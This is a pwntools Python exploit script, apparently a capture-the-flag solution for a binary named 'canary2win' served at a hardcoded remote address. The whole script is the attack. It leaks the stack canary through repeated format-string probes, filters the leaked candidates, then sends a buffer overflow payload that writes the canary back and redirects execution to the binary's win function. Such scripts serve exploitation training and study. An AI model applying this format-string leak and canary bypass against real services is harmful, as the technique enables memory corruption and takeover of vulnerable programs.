from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Set up pwntools for the correct architecture
exe = './canary2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent

# Start program
io = remote("34.101.174.85", 10002)

# 1: Leak Canary
potential_canaries = []
for i in range(1, 51):
    io.sendlineafter(b'>', '%{}$p'.format(i).encode())
    line = io.recvline().strip()
    if line.endswith(b'00'):
        potential_canaries.append(int(line, 16))

# Filter yg ga berawalan dgn 0xf7 or 0xff
canaries = [canary for canary in potential_canaries if not (canary & 0xff00000000000000 in [0xf700000000000000, 0xff00000000000000])]

if canaries:
    canary = canaries[0]
else:
    error("No valid canary found!")

info('canary = 0x%x (%d)', canary, canary)

# 2: Payload
padding_to_canary = 0x28
payload = b'A' * padding_to_canary 
payload += p64(canary)
payload += b'A' * 8
payload += p64(elf.symbols.win)

# Send the payload
io.sendlineafter(b'>', payload)
io.interactive()
